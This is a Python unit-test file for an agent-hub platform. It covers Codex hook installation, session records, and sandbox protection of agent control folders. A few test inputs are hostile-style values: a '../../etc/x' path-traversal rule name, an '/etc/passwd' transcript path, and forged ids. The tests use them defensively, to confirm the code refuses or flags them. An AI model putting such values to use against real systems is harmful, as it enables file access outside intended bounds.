            for conf, want in (({}, 1), ({"credentials.dirs": [elsewhere]}, 0)):
                rows = []
                with mock.patch.dict(os.environ, {"CODEX_HOME": elsewhere}), \
                        mock.patch.object(hubconf, "get", lambda k, default=None, conf=conf: conf.get(k, default)):
                    ah.doctor_credential_homes(lambda *a: rows.append(a), ["codex"])
                self.assertEqual(len(rows), want, conf)
                if rows:
                    self.assertIn(elsewhere, rows[0][1])
                    self.assertIn("CODEX_HOME", rows[0][1])
        self.assertIsNone(runtime_codex.credential_override({}))
        self.assertIsNone(runtime_codex.credential_override({"CODEX_HOME": str(pathlib.Path.home() / ".codex")}))
        got = runtime_claude.credential_override({"CLAUDE_CONFIG_DIR": "/somewhere/else"})
        self.assertTrue(got and got[2] == ["/somewhere/else/.credentials.json"])

    def test_one_runtimes_trouble_doesnt_stop_the_next(self):
        ah = ti.load_file("agenthub_codex_trouble", BIN / "agenthub")
        import types
        broken = types.SimpleNamespace(user_refresh=lambda apply: (_ for _ in ()).throw(RuntimeError("boom")))
        fine = types.SimpleNamespace(user_refresh=lambda apply: ["the thing"])
        mods = {"broken": broken, "fine": fine}
        rows = []
        with mock.patch.object(runtime_ports, "_module", lambda name: mods[name]):
            ah.doctor_user_settings(lambda *a: rows.append(a), ["broken", "fine"])
        self.assertEqual(len(rows), 2)
        self.assertIn("boom", rows[0][1])
        self.assertIn("the thing", rows[1][1])


class CodexOnlyDoctor(unittest.TestCase):
    """cmd_doctor itself with runtime.default none and Codex installed (tests/test_doctor_rows.py's machine stand-ins)."""

    def setUp(self):
        import test_doctor_rows as tdr
        self.tdr = tdr
        tdr.Doctor.setUp(self)
        self.cfg["runtime"] = {"default": "none", "installed": ["codex"]}
        p = mock.patch.object(runtime_codex, "codex_home", lambda: self.tmp / "codex-home")
        p.start()
        self.addCleanup(p.stop)

    def run_(self, cmd, *a, **k):
        return self.tdr.Doctor.run_(self, cmd, *a, **k)

    def test_it_says_dispatch_is_off_and_lists_codexs_features(self):
        rows = self.tdr.Doctor.doctor(self)
        texts = [r[1] for r in rows]
        with mock.patch.object(hubconf, "_cfg", self.cfg):   # the language doctor ran in
            self.check(texts)

    def check(self, texts):
        off = i18n.translate("agenthub", "the platform starts no AI agent (runtime.default: none): mailbox dispatch is off, so "
                             "a letter nobody picks up waits for a session's hook or for you; sessions of {names} are "
                             "served by their hooks", {"names": "codex"})
        self.assertIn(off, texts)
        rules = runtime_ports.features()[8][0]
        self.assertTrue(any(t.startswith("codex") and rules in t for t in texts), "Codex's own feature rows")
        none_row = i18n.translate("agenthub", "AI agent features are off: no AI agent is set up for brunna to run. Notes, "
                                  "schedules and the mailbox work without one", {})
        self.assertNotIn(none_row, texts)
        missing = runtime_codex.user_missing()
        self.assertTrue(any(missing in t for t in texts), "the hooks aren't installed: said")


class Fixes(Home):
    """The second review's findings (docs/design/runtime-codex.md, "Step 2: progress")."""

    def test_a_group_shared_with_the_users_handler_is_refused(self):
        mine = {"type": "command", "command": "echo mine"}
        ours = runtime_codex.platform_handler("PostToolUse", "tool_used")
        (self.home / "hooks.json").write_text(json.dumps({"hooks": {"PostToolUse": [{"matcher": "Edit", "hooks": [ours, mine]}]}}))
        before = (self.home / "hooks.json").read_text()
        with self.assertRaises(runtime_codex.Refused):
            runtime_codex.user_install(True)
        self.assertEqual((self.home / "hooks.json").read_text(), before)
        self.assertEqual(runtime_codex.user_refresh(True), [], "upgrade says nothing and writes nothing")

    def test_legal_toml_it_didnt_expect_is_kept_or_refused_never_a_traceback(self):
        key = f"{os.path.realpath(self.home / 'hooks.json')}:session_start:0:0"
        cfg = ('when = 1979-05-27T07:32:00Z\nn = nan\n'
               '[hooks.state."\\U0001F600:x"]\ntrusted_hash = "old"\n')
        (self.home / "config.toml").write_text(cfg)
        runtime_codex.user_install(True)
        got = tomllib.loads((self.home / "config.toml").read_text())
        self.assertEqual(got["hooks"]["state"]["\U0001F600:x"], {"trusted_hash": "old"})
        self.assertIn(key, got["hooks"]["state"])
        self.assertTrue((self.home / "config.toml").read_text().startswith(cfg))
        self.assertEqual(runtime_codex.set_trust('[hooks.state."\\U0001F600:x"]\ntrusted_hash = "a"\n', {"\U0001F600:x": "b"}),
                         '[hooks.state."\\U0001F600:x"]\ntrusted_hash = "b"\n', "the header's key read as TOML reads it")
        with mock.patch.object(runtime_codex, "_set_trust", lambda text, entries: 1 / 0):
            with self.assertRaises(runtime_codex.Refused):
                runtime_codex.set_trust("", {"k": "v"})
            self.assertIsNotNone(runtime_codex.user_missing())

    def test_crlf_files_keep_their_line_ends(self):
        (self.home / "config.toml").write_bytes(b'model = "x"\r\n')
        (self.home / "hooks.json").write_bytes(b'{\r\n  "hooks": {}\r\n}\r\n')
        runtime_codex.user_install(True)
        for f in ("config.toml", "hooks.json"):
            data = (self.home / f).read_bytes()
            self.assertEqual(data.count(b"\n"), data.count(b"\r\n"), f)
        self.assertTrue((self.home / "config.toml").read_bytes().startswith(b'model = "x"\r\n'))

    def test_a_file_changed_after_the_plan_is_not_written_and_a_half_write_says_what_landed(self):
        plan = runtime_codex._plan()
        (self.home / "config.toml").write_text("# someone else\n")
        with self.assertRaises(runtime_codex.Refused):
            runtime_codex._apply(plan)
        self.assertFalse((self.home / "hooks.json").exists())
        plan = runtime_codex._plan()
        real = runtime_codex._write

        def write(path, text):
            if path.name == "config.toml":
                raise OSError("disk full")
            real(path, text)
        with mock.patch.object(runtime_codex, "_write", write), self.assertRaises(runtime_codex.Refused) as cm:
            runtime_codex._apply(plan)
        self.assertTrue((self.home / "hooks.json").exists())
        self.assertIn(str(self.home / "hooks.json"), str(cm.exception))
        self.assertIsNotNone(runtime_codex.user_missing(), "doctor shows them untrusted")


class Recorded(unittest.TestCase):
    """unrecorded(): no false positives; and the end mark that a session ending on record leaves."""

    def setUp(self):
        self.tmp = pathlib.Path(tempfile.mkdtemp()).resolve()
        self.addCleanup(shutil.rmtree, self.tmp, ignore_errors=True)
        self.home = self.tmp / "codex-home"
        self.ws = self.tmp / "proj"
        self.ws.mkdir()
        (self.tmp / "caged").mkdir()
        docs = {"proj": {"paths": {"workspace": str(self.ws)}}, "caged": {"paths": {"workspace": str(self.tmp / "caged")},
                                                                          "enforce": {"sandbox": True}}}
        for p in (mock.patch.object(runtime_codex, "codex_home", lambda: self.home),
                  mock.patch.object(hubconf, "secrets_dir", lambda: self.tmp / "secrets"),
                  mock.patch.object(hubconf, "projects", lambda: docs)):
            p.start()
            self.addCleanup(p.stop)

    def rollout(self, sid, cwd, originator="codex_cli_rs"):
        import datetime as dt
        day = self.home / "sessions" / f"{dt.date.today():%Y/%m/%d}"
        day.mkdir(parents=True, exist_ok=True)
        f = day / f"rollout-2026-11-14T05-05-15-{sid}.jsonl"
        f.write_text(json.dumps({"type": "session_meta", "payload": {"session_id": sid, "cwd": str(cwd),
                                                                     "originator": originator}}) + "\n")
        return f

    def test_only_a_person_s_session_in_a_served_project_counts(self):
        self.rollout(SID, self.ws / "sub")
        self.rollout(SID2, self.tmp / "elsewhere")
        self.rollout("01a1d6bb-0000-7000-8000-000000000003", self.tmp / "caged")
        self.rollout("01a1d6bb-0000-7000-8000-000000000004", self.ws, originator="codex_exec")
        self.assertEqual(runtime_codex.unrecorded(), [SID])

    def test_a_session_that_ended_on_record_counts_as_recorded(self):
        self.rollout(SID, self.ws)
        key = f"codex:{SID}"
        with ti.hub_json(installed=["claude", "codex"]):
            runtime_ports.record_session(key, "codex", os.getpid(), str(self.ws), stale_s=runtime_codex.SESSION_STALE_S)
            he = ti.load_file("hub_event_end_mark", BIN / "hub-event")
            he._RT, he._RT_NAME = runtime_codex, "codex"
            ev = runtime_ports.HubEvent("session_end", key, str(self.ws))
            he.end_mark(ev, None)
            he.wake_address_drop(ev, None)
        self.assertFalse(hubconf.session_file(key, runtime_ports.SESSION_RECORD).exists())
        self.assertTrue(hubconf.session_file(key, runtime_ports.SESSION_ENDED).exists(), "kept past the end")
        self.assertEqual(runtime_codex.unrecorded(), [])
        he._RT = runtime_claude
        self.assertIsNone(he.end_mark(runtime_ports.HubEvent("session_end", "x", "/w"), None))
        self.assertFalse(hubconf.session_file("x", runtime_ports.SESSION_ENDED).exists(), "only where a runtime checks")

    def test_exec_is_told_by_its_rollout_before_its_command_line(self):
        f = self.rollout(SID, self.ws, originator="codex_exec")
        raw = json.dumps({"session_id": SID, "cwd": str(self.ws), "transcript_path": str(f)})
        with mock.patch.object(runtime_ports, "_parent_and_command", lambda pid: (1, "/x/codex app-server")):
            self.assertFalse(runtime_codex.person_session(7, {}, raw=raw))
        g = self.rollout(SID2, self.ws)
        raw = json.dumps({"session_id": SID2, "cwd": str(self.ws), "transcript_path": str(g)})
        with mock.patch.object(runtime_ports, "_parent_and_command", lambda pid: (1, "/x/codex exec")):
            self.assertTrue(runtime_codex.person_session(7, {}, raw=raw))
        raw = json.dumps({"session_id": SID2, "cwd": str(self.ws), "transcript_path": "/etc/passwd"})
        for cmd, person in (("/x/codex -m o3 exec hi", False), ("/x/codex -c a=b --full-auto e hi", False),
                            ("/x/codex --model o3", True), ("/x/codex resume", True)):
            with mock.patch.object(runtime_ports, "_parent_and_command", lambda pid, cmd=cmd: (1, cmd)):
                self.assertEqual(runtime_codex.person_session(7, {}, raw=raw), person, cmd)

    def test_the_executable_counts_not_an_argument(self):
        self.assertFalse(runtime_codex.session_process("/bin/zsh -c /usr/local/bin/codex"))
        self.assertFalse(runtime_codex.session_process("/usr/bin/vim /tmp/codex"))
        self.assertTrue(runtime_codex.session_process("/x/.codex/packages/app-server-daemon/0.169.0/codex app-server"))


class NoticeHold(ti.Bus):
    """A session told only at its start holds a letter NOTICE_HOLD_MIN, not TAKE_TIMEOUT_MIN; its ack holds as anyone's."""

    def held_after(self, sid, minutes, ack=False):
        import datetime as dt
        self.send("m1", "request")
        r = self.hb.addressed_to(self.c, "proj")[0]
        self.hb.record_presence(self.c, sid, "proj", self.ws, None)
        self.hb.routed(self.c, r, sid, "hook")
        if ack:
            self.hb.publish(self.c, f"m1:delivered:{sid}:ack", "message.delivered", "proj", "proj", "m1",
                            {"session": sid, "via": "ack"})
        ts = (dt.datetime.now().astimezone() - dt.timedelta(minutes=minutes)).isoformat(timespec="seconds")
        self.c.execute("UPDATE events SET ts=? WHERE type='message.routed'", (ts,))
        self.c.commit()
        with ti.hub_json(installed=["claude", "codex"]):
            st = self.hb.letter_state(self.c, r, self.hb.Live(c=self.c))
        return st

    def test_a_codex_notice_holds_ten_minutes(self):
        self.assertTrue(self.held_after(f"codex:{SID}", 5).held)
        self.c.execute("DELETE FROM events")
        self.c.commit()
        self.assertFalse(self.held_after(f"codex:{SID}", self.hb.NOTICE_HOLD_MIN + 1).held)

    def test_a_claude_session_still_holds_an_hour(self):
        self.assertTrue(self.held_after(CLAUDE_SID, self.hb.NOTICE_HOLD_MIN + 1).held)

    def test_an_ack_takes_it_as_anyones(self):
        st = self.held_after(f"codex:{SID}", self.hb.NOTICE_HOLD_MIN + 1, ack=True)
        self.assertEqual(st.taken, "now")

    def test_the_notice_names_only_ids_of_the_right_form(self):
        qs = [{"id": "q1", "ts": "2026-11-14T05:00:00+08:00", "text": "t"},
              {"id": "a forged id with spaces", "ts": "2026-11-14T05:00:00+08:00", "text": "t"}]
        self.hb.open_questions = lambda c, project=None: qs
        note = self.hb.questions_note(self.c, "proj", texts=False)
        self.assertIn("[q1]", note)
        self.assertNotIn("forged", note)


class RuleNames(unittest.TestCase):
    def test_only_rule_names_are_listed(self):
        import io
        import prompts
        with tempfile.TemporaryDirectory() as d:
            f = pathlib.Path(d) / "RULES"
            f.write_text("engineering\n../../etc/x Multi multi-agent-review\n")
            err = io.StringIO()
            with mock.patch("sys.stderr", err):
                got = prompts.listed_rules(f, {"commits": "conventional"})
        self.assertEqual(got, ["engineering", "multi-agent-review", "conventional-commits"])
        self.assertIn("../../etc/x", err.getvalue())


class Control(Home):
    """Codex's control port (runtime-codex.md, Step 4 r2, S1/S3): .codex and .agents, protected in every sandbox
    whether or not Codex is installed; its sessions still aren't confined (no confine port; B1)."""

    def test_it_has_the_control_port_but_its_sessions_stay_unconfined(self):
        self.assertIn("control", runtime_ports.capabilities("codex"))
        self.assertNotIn("confine", runtime_ports.capabilities("codex"))
        self.assertFalse(runtime_ports.sessions_confined("codex"))
        self.assertEqual(runtime_codex.control_paths(), [(".codex", True), (".agents", True)])
        self.assertEqual(runtime_codex.control_root(), (".codex", ()))

    def test_protected_whatever_is_installed(self):
        for installed in (["claude"], ["claude", "codex"]):
            with ti.hub_json(installed=installed):
                self.assertIn("codex", runtime_ports.protected_runtimes())
                import policy
                names = [x["name"] for x in policy.protect()]
                self.assertIn(".codex", names)
                self.assertIn({"name": ".codex", "writable": []}, policy.protect_roots())
                self.assertEqual(len(names), len(set(names)))

    def test_every_entry_in_its_folder_is_foreign_and_a_link_is_said(self):
        ws = self.tmp / "ws"
        ws.mkdir()
        self.assertEqual(runtime_codex.foreign_controls(ws), [])
        (ws / ".codex").mkdir()
        (ws / ".codex" / "hooks.json").write_text("{}")
        (ws / ".codex" / "config.toml").write_text("")
        got = runtime_codex.foreign_controls(ws)
        self.assertEqual(len(got), 2)
        self.assertTrue(".codex/config.toml" in got[0] and ".codex/hooks.json" in got[1], got)
        other = self.tmp / "ws2"
        other.mkdir()
        (other / ".codex").symlink_to(ws / ".codex")
        self.assertEqual(len(runtime_codex.foreign_controls(other)), 1)

    def test_nested_and_long_s_ones_are_found_but_not_past_the_skipped_folders(self):
        """review S5: planted before the protection came, at any depth"""
        ws = self.tmp / "ws3"
        for d in ("sub/.codex", "a/b/.agents/skills/x", "c/.agentſ", "node_modules/p/.codex", ".git/x/.agents"):
            (ws / d).mkdir(parents=True)
        got = " ".join(runtime_codex.foreign_controls(ws))
        for d in ("sub/.codex", "a/b/.agents", "c/.agentſ"):
            self.assertIn(d, got)
        self.assertNotIn("node_modules", got)
        self.assertNotIn(".git/", got)

    def test_its_user_level_skills_are_no_sandboxs_to_write(self):
        """review S1: ~/.agents loads for every session of the user's"""
        import policy
        self.assertIn(str(pathlib.Path.home() / ".agents"), runtime_ports.user_controls()[0])
        pol = policy.policy("p", {"name": "p", "paths": {"workspace": str(self.tmp / "p")}}, {"projects": {}})
        self.assertIn(pathlib.Path.home() / ".agents", pol["deny_write"])
        self.assertIn(str(pathlib.Path.home() / ".codex"), [str(p) for p in pol["credentials"]],
                      "its home denied whole, declared by its adapter")

    def test_a_broken_adapter_is_left_out_and_said(self):
        import io
        from contextlib import redirect_stderr
        real = runtime_ports._module

        def broken(name):
            if name == "acp":
                raise RuntimeError("boom")
            return real(name)
        err = io.StringIO()
        with mock.patch.object(runtime_ports, "_module", broken), redirect_stderr(err):
            got = runtime_ports.protected_runtimes()
        self.assertIn("codex", got)
        self.assertIn("acp", err.getvalue())


if __name__ == "__main__":
    unittest.main()
